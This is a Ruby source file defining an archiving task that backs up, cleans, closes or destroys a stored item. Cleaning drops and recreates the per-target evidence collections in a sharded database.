require_relative '../tasks'

module RCS
module DB

class ArchiveTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    @item = ::Item.find(@params['_id'])

    steps = 0

    # calculate the number of selected steps
    ['backup', 'clean', 'close', 'destroy'].each {|key| steps += 1 if @params[key]}

    return steps + 2
  end
  
  def next_entry
    yield @description = "Archiving #{@item[:name]}"

    yield do_backup if @params['backup']
    yield do_clean if @params['clean']
    yield do_close if @params['close']
    yield do_destroy if @params['destroy']

    yield @description = "#{@item[:name]} archived successfully"
  end


  def do_backup
    trace :info, "Creating backup for #{@item._kind} #{@item.name}"

    begin
      # create a fake backup job to handle the process
      backup = ::Backup.new
      backup.name = "Archive_#{@item.name.gsub(' ', '')}"
      backup.what = "#{@item._kind}:#{@item._id}"

      # perform the backup job
      BackupManager.do_backup Time.now.getutc, backup

      # save information from the finished backup
      status = backup.status
    ensure
      # remove the fake backup job
      backup.destroy
    end

    raise "Error while performing backup" if status != 'COMPLETED'
  end

  def do_clean
    # take the item and subitems contained in it
    ::Item.any_of({_id: @item._id}, {path: @item._id}).each do |item|
      next if item._kind != 'target'
      trace :info, "Cleaning #{item.name} - #{item._id}"

      db = DB.instance.new_connection("rcs")

      # drop the collections to delete all the documents in a fast way
      Evidence.collection_class(item._id).collection.drop
      GridFS.drop_collection(item._id.to_s)

      # recreate the collection for the target
      collection = db.collection(Evidence.collection_name(item._id))
      Evidence.collection_class(item._id).create_indexes
      RCS::DB::Shard.set_key(collection, {type: 1, da: 1, aid: 1})
    end
  end

  def do_close
    trace :info, "Closing #{@item._kind} #{@item.name}"

    @item.status = 'closed'
    @item.save
  end

  def do_destroy
    trace :info, "Destroying #{@item._kind} #{@item.name}"

    @item.destroy
  end
end

end # DB
end # RCS